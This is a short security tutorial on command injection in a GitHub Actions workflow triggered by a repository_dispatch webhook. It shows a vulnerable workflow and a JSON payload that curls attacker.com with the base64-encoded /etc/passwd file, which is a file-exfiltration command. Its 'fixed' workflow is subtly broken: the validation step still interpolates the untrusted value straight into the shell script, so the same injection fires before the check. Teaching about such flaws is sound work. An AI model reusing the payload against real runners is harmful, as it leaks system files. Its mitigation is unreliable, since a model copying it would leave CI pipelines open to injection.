# Advanced Attack Scenario 7: Exploiting insecure webhooks that trigger workflows

This scenario demonstrates how an attacker can exploit a workflow that is triggered by a webhook, but does not validate the webhook payload.

## The Vulnerability

A workflow that is triggered by a webhook, but does not validate the webhook payload. The vulnerability lies in the fact that the workflow can be triggered by a malicious payload that is sent to the webhook. This can allow an attacker to execute arbitrary commands on the runner.

**Vulnerable Code:**

```yaml
name: Vulnerable Workflow
on:
  repository_dispatch:
    types: [my-event]
jobs:
  vulnerable_job:
    runs-on: ubuntu-latest
    steps:
      - name: Vulnerable Step
        run: |
          echo "Running command: ${{ github.event.client_payload.command }}"
```

## The Exploitation

An attacker can send a malicious payload to the webhook to trigger the workflow and execute arbitrary commands.

**Malicious Payload:**

```json
{
  "event_type": "my-event",
  "client_payload": {
    "command": "; curl http://attacker.com/$(cat /etc/passwd | base64)"
  }
}
```

**Expected Outcome:**

The workflow will execute the `curl` command, sending the base64-encoded contents of the `/etc/passwd` file to the attacker's server.

## The Mitigation

To mitigate this vulnerability, you should properly validate the webhook payload before using it in your workflow. For example, you can use a regular expression to ensure that the `command` input only contains a valid command.

**Fixed Code:**

```yaml
name: Fixed Workflow
on:
  repository_dispatch:
    types: [my-event]
jobs:
  fixed_job:
    runs-on: ubuntu-latest
    steps:
      - name: Validate input
        run: |
          if ! [[ "${{ github.event.client_payload.command }}" =~ ^[a-zA-Z0-9_-]+$ ]]; then
            echo "Invalid command"
            exit 1
          fi
      - name: Fixed Step
        run: |
          echo "Running command: ${{ github.event.client_payload.command }}"
```
